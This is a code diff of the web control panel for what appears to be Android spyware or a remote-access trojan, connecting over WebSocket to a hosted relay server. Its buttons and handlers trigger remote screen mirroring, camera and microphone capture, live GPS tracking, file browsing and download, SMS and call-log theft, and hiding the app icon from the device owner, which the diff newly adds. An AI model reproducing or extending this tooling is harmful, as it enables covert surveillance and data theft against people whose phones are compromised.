@@ -9,180 +9,127 @@
 /* ===== GLOBAL ===== */
 
 body{
-margin:0;
-background:#eef2f7;
-font-family:Segoe UI;
-display:flex;
-height:100vh;
-overflow:hidden;
-color:#222;
+    margin:0;
+    font-family:'Segoe UI',sans-serif;
+    background:#f4f7fb;
+    display:flex;
+    height:100vh;
 }
 
 /* ===== SIDEBAR ===== */
 
 #sidebar{
-width:280px;
-background:#ffffff;
-border-right:1px solid #d6dde6;
-padding:20px;
-overflow-y:auto;
+    width:280px;
+    background:#ffffff;
+    border-right:1px solid #e1e6ef;
+    padding:20px;
+    overflow-y:auto;
 }
 
 .logo{
-font-size:20px;
-font-weight:700;
-margin-bottom:25px;
-color:#2b7cff;
+    font-size:20px;
+    font-weight:700;
+    color:#007aff;
+    margin-bottom:25px;
 }
 
-.section-title{
-font-size:12px;
-letter-spacing:1px;
-color:#6b7a90;
-margin-top:20px;
-margin-bottom:8px;
-}
-
-/* BUTTONS */
+/* Buttons */
 
 button{
-width:100%;
-padding:10px;
-margin:6px 0;
-border-radius:8px;
-border:none;
-background:#f1f5fa;
-cursor:pointer;
-transition:.2s;
-font-weight:600;
+    width:100%;
+    padding:11px;
+    margin:6px 0;
+    border-radius:8px;
+    border:none;
+    background:#eef3fb;
+    cursor:pointer;
+    font-weight:600;
 }
 
 button:hover{
-background:#2b7cff;
-color:white;
+    background:#007aff;
+    color:white;
 }
 
 /* ===== MAIN ===== */
 
 #main{
-flex:1;
-display:flex;
-flex-direction:column;
+    flex:1;
+    display:flex;
+    flex-direction:column;
 }
 
+/* HEADER */
+
 #header{
-height:60px;
-background:white;
-border-bottom:1px solid #d6dde6;
-display:flex;
-align-items:center;
-justify-content:space-between;
-padding:0 25px;
-font-weight:600;
+    height:65px;
+    background:white;
+    border-bottom:1px solid #e1e6ef;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 25px;
 }
 
 .status{
-padding:6px 14px;
-border-radius:20px;
-font-size:12px;
-background:#e9eef5;
+    padding:6px 14px;
+    border-radius:20px;
+    background:#e6f7ec;
+    color:#0a8f3c;
+    font-weight:600;
 }
 
-.online{color:#1c9b5f;}
-.offline{color:#d64545;}
+/* ===== SINGLE OUTPUT PANEL ===== */
 
-/* CONTENT */
-
-#content{
-flex:1;
-display:flex;
-gap:20px;
-padding:20px;
+#panel{
+    flex:1;
+    margin:20px;
+    background:white;
+    border-radius:16px;
+    box-shadow:0 8px 30px rgba(0,0,0,.05);
+    overflow:hidden;
+    display:flex;
+    flex-direction:column;
 }
 
-/* VIDEO */
+/* VIDEO AREA */
 
-#video-panel{
-flex:2;
-background:white;
-border-radius:12px;
-box-shadow:0 5px 18px rgba(0,0,0,.06);
-display:flex;
-align-items:center;
-justify-content:center;
+#videoArea{
+    height:320px;
+    background:#000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
 }
 
-video,img{
-width:100%;
-height:100%;
-object-fit:contain;
-border-radius:12px;
+video, img{
+    width:100%;
+    height:100%;
+    object-fit:contain;
 }
 
-/* OUTPUT BOX */
+/* DATA AREA */
 
-#output-panel{
-flex:1.2;
-background:white;
-border-radius:12px;
-padding:15px;
-overflow:auto;
-box-shadow:0 5px 18px rgba(0,0,0,.06);
+#dataArea{
+    flex:1;
+    overflow:auto;
+    padding:15px;
 }
 
-/* TABLE */
+/* FILE STYLE */
 
-table{
-width:100%;
-border-collapse:collapse;
-font-size:13px;
+.file{
+    padding:10px;
+    border-bottom:1px solid #eee;
+    display:flex;
+    justify-content:space-between;
 }
 
-th,td{
-padding:8px;
-border-bottom:1px solid #e6ecf3;
-text-align:left;
-}
-
-th{
-background:#f6f9fc;
-}
-
-/* FILE LIST */
-
-.file-row{
-display:flex;
-justify-content:space-between;
-padding:8px;
-border-bottom:1px solid #eef2f7;
-cursor:pointer;
-}
-
-.file-row:hover{
-background:#f2f7ff;
-}
-
-/* MAP */
+/* Map */
 
 #map{
-height:350px;
-border-radius:10px;
-}
-
-/* PAGINATION */
-
-.pagination{
-display:flex;
-justify-content:center;
-margin-top:10px;
-gap:5px;
-}
-
-.page-btn{
-padding:4px 10px;
-background:#eef3ff;
-border-radius:6px;
-cursor:pointer;
+    height:350px;
+    border-radius:10px;
 }
 
 </style>
@@ -190,56 +137,70 @@ cursor:pointer;
 
 <body>
 
+<!-- SIDEBAR -->
+
 <div id="sidebar">
 
-<div class="logo">SystemSync ELITE</div>
+<div class="logo">SYSTEMSYNC</div>
 
-<div class="section-title">SURVEILLANCE</div>
-<button onclick="startScreen()">Screen Mirror</button>
-<button onclick="stopScreen()">Stop Screen</button>
-<button onclick="send('camFront')">Front Camera</button>
-<button onclick="send('camBack')">Back Camera</button>
-<button onclick="send('startAudio')">Start Mic</button>
-<button onclick="send('stopAudio')">Stop Mic</button>
+<button onclick="startScreen()">🖥 Screen Mirror</button>
+<button onclick="stopScreen()">⏹ Stop Screen</button>
+<button onclick="send('camFront')">📹 Front Camera</button>
+<button onclick="send('camBack')">📹 Back Camera</button>
+<button onclick="send('getLocation')">📍 Live GPS</button>
+<button onclick="send('startAudio')">🎤 Start Mic</button>
+<button onclick="send('stopAudio')">⏹ Stop Mic</button>
 
-<div class="section-title">DATA</div>
-<button onclick="send('ls root')">File Manager</button>
-<button onclick="send('getSMS inbox')">SMS Logs</button>
-<button onclick="send('getCallLogs')">Call Logs</button>
-<button onclick="send('getLocation')">GPS</button>
+<hr>
+
+<button onclick="send('ls root')">📂 File Manager</button>
+<button onclick="send('getSMS inbox')">💬 SMS Logs</button>
+<button onclick="send('getCallLogs')">📞 Call Logs</button>
+
+<hr>
+
+<button onclick="send('hideApp')">👻 Hide App</button>
+<button onclick="send('showApp')">👁 Show App</button>
 
 </div>
+
+<!-- MAIN -->
 
 <div id="main">
 
 <div id="header">
-CONTROL PANEL
-<div id="status" class="status offline">OFFLINE</div>
+<div><b>ELITE CONTROL</b></div>
+<div id="status" class="status">CONNECTING...</div>
 </div>
 
-<div id="content">
+<!-- 🔥 ONE PANEL ONLY -->
 
-<div id="video-panel">
-No video feed
-</div>
+<div id="panel">
 
-<div id="output-panel">
-Output ready…
+<div id="videoArea">
+<div>No Media</div>
 </div>
 
+<div id="dataArea"></div>
+
 </div>
+
 </div>
+
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
 
 const WS_URL="wss://mirror-view.onrender.com";
+
 let ws;
 let pc;
-let mapInstance;
+let mapInstance=null;
 
+// CONNECT
 function connect(){
+
 ws=new WebSocket(WS_URL);
 
 ws.onopen=()=>{
@@ -247,167 +208,154 @@ ws.send("I_AM_WEB");
 setStatus("ONLINE");
 };
 
-ws.onclose=()=>setStatus("OFFLINE");
+ws.onclose=()=>{
+setStatus("OFFLINE");
+setTimeout(connect,4000);
+};
 
 ws.onmessage=(e)=>{
+
 const msg=e.data;
 
-if(msg.startsWith("SMS_DATA:"))
-renderTable(JSON.parse(msg.substring(9)),"SMS");
-
-else if(msg.startsWith("CALL_DATA:"))
-renderTable(JSON.parse(msg.substring(10)),"CALL");
-
-else if(msg.startsWith("FILE_LIST:"))
-renderFiles(JSON.parse(msg.substring(10)));
-
-else if(msg.startsWith("LOC_DATA:"))
+if(msg.startsWith("LOC_DATA:")){
 renderMap(JSON.parse(msg.substring(9)));
+}
 
-else if(msg.startsWith("CAMERA_IMAGE:"))
+else if(msg.startsWith("FILE_LIST:")){
+renderFiles(JSON.parse(msg.substring(10)));
+}
+
+else if(msg.startsWith("SMS_DATA:")){
+renderRaw(JSON.parse(msg.substring(9)));
+}
+
+else if(msg.startsWith("CALL_DATA:")){
+renderRaw(JSON.parse(msg.substring(10)));
+}
+
+else if(msg.startsWith("CAMERA_IMAGE:")){
 showImage(msg.substring(13));
+}
 
-else if(msg.startsWith("RTC_OFFER:screen:"))
+else if(msg.startsWith("RTC_OFFER:screen:")){
 handleOffer(msg.substring(17));
+}
+
+else if(msg.startsWith("ICE_CANDIDATE:")){
+handleIce(msg.substring(14));
+}
+
 };
+
 }
 
-function setStatus(s){
-const el=document.getElementById('status');
-el.innerText=s;
-el.className="status "+(s==="ONLINE"?"online":"offline");
+function setStatus(t){
+document.getElementById("status").innerText=t;
 }
 
+// COMMAND
 function send(cmd){
-ws.send(cmd);
+if(ws.readyState===1) ws.send(cmd);
 }
 
-/* -------- TABLE ---------- */
+// ---------- VIDEO ----------
 
-function formatDate(ts){
-const d=new Date(ts);
-return d.toLocaleDateString()+" "+d.toLocaleTimeString();
+function showImage(b64){
+document.getElementById("videoArea").innerHTML=
+`<img src="data:image/jpeg;base64,${b64}">`;
 }
 
-function formatDuration(sec){
-const m=Math.floor(sec/60);
-const s=sec%60;
-return `${m}:${s.toString().padStart(2,'0')}`;
-}
+// ---------- MAP ----------
 
-function renderTable(data,type){
+function renderMap(data){
 
-let page=0;
-const perPage=20;
-
-function draw(){
-
-const slice=data.slice(page*perPage,(page+1)*perPage);
-
-let html="<table><tr>";
-
-Object.keys(slice[0]).forEach(k=>html+=`<th>${k}</th>`);
-html+="</tr>";
-
-slice.forEach(row=>{
-html+="<tr>";
-Object.entries(row).forEach(([k,v])=>{
-
-if(k==="duration") v=formatDuration(v);
-if(k==="date") v=formatDate(v);
-
-html+=`<td>${v}</td>`;
-});
-html+="</tr>";
-});
-
-html+="</table>";
-
-html+=`<div class='pagination'>
-<button onclick='prev()'>Prev</button>
-<button onclick='next()'>Next</button>
-</div>`;
-
-document.getElementById('output-panel').innerHTML=html;
-}
-
-window.prev=()=>{if(page>0){page--;draw();}};
-window.next=()=>{if((page+1)*perPage<data.length){page++;draw();}};
-
-draw();
-}
-
-/* -------- FILE EXPLORER -------- */
-
-function renderFiles(files){
-
-let html="<h3>File Explorer</h3>";
-
-files.forEach(f=>{
-html+=`
-<div class='file-row'
-onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
-<div>${f.isDir?'📁':'📄'} ${f.name}</div>
-<div>${(f.size/1024).toFixed(1)} KB</div>
-</div>`;
-});
-
-document.getElementById('output-panel').innerHTML=html;
-}
-
-/* -------- MAP -------- */
-
-function renderMap(d){
-
-document.getElementById('output-panel').innerHTML="<div id='map'></div>";
+document.getElementById("dataArea").innerHTML=`<div id="map"></div>`;
 
 if(mapInstance) mapInstance.remove();
 
-mapInstance=L.map('map').setView([d.lat,d.lon],17);
+setTimeout(()=>{
+
+mapInstance=L.map('map').setView([data.lat,data.lon],18);
 
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
 .addTo(mapInstance);
 
-L.marker([d.lat,d.lon]).addTo(mapInstance);
+L.marker([data.lat,data.lon]).addTo(mapInstance);
+
+},200);
+
 }
 
-/* -------- IMAGE -------- */
+// ---------- FILES ----------
 
-function showImage(base64){
-document.getElementById('video-panel').innerHTML=
-`<img src="data:image/jpeg;base64,${base64}">`;
+function renderFiles(files){
+
+let html="";
+
+files.forEach(f=>{
+
+html+=`
+<div class="file">
+<div>${f.isDir?'📁':'📄'} ${f.name}</div>
+<button onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
+${f.isDir?'OPEN':'DL'}
+</button>
+</div>`;
+});
+
+document.getElementById("dataArea").innerHTML=html;
+
 }
 
-/* -------- WEBRTC -------- */
+// RAW JSON DISPLAY (SMS / CALL)
 
-async function startScreen(){
-send("START_SCREEN_SHARE");
+function renderRaw(data){
+
+document.getElementById("dataArea").innerHTML=
+`<pre>${JSON.stringify(data,null,2)}</pre>`;
+
+}
+
+// ---------- SCREEN SHARE ----------
+
+function startScreen(){
+send('START_SCREEN_SHARE');
 }
 
 function stopScreen(){
-send("STOP_SCREEN_SHARE");
-if(pc){pc.close();pc=null;}
+
+send('STOP_SCREEN_SHARE');
+
+if(pc){
+pc.close();
+pc=null;
+}
+
+document.getElementById("videoArea").innerHTML="No Media";
+
 }
 
 function handleOffer(sdp){
 
 if(!pc){
+
 pc=new RTCPeerConnection({
 iceServers:[{urls:'stun:stun.l.google.com:19302'}]
 });
 
-pc.ontrack=e=>{
-document.getElementById('video-panel').innerHTML=
-"<video autoplay playsinline></video>";
+pc.ontrack=(e)=>{
+document.getElementById("videoArea").innerHTML=
+'<video id="remoteVideo" autoplay playsinline></video>';
 
-document.querySelector("video").srcObject=e.streams[0];
+document.getElementById("remoteVideo").srcObject=e.streams[0];
 };
 
-pc.onicecandidate=e=>{
+pc.onicecandidate=(e)=>{
 if(e.candidate){
 ws.send('ICE_CANDIDATE:'+JSON.stringify(e.candidate));
 }
 };
+
 }
 
 pc.setRemoteDescription(
@@ -415,9 +363,18 @@ new RTCSessionDescription({type:'offer',sdp})
 )
 .then(()=>pc.createAnswer())
 .then(a=>pc.setLocalDescription(a))
-.then(()=>ws.send('ANSWER:'+pc.localDescription.sdp));
+.then(()=>{
+ws.send('ANSWER:'+pc.localDescription.sdp);
+});
+
 }
 
+function handleIce(c){
+if(!pc) return;
+pc.addIceCandidate(new RTCIceCandidate(JSON.parse(c)));
+}
+
+// INIT
 connect();
 
 </script>
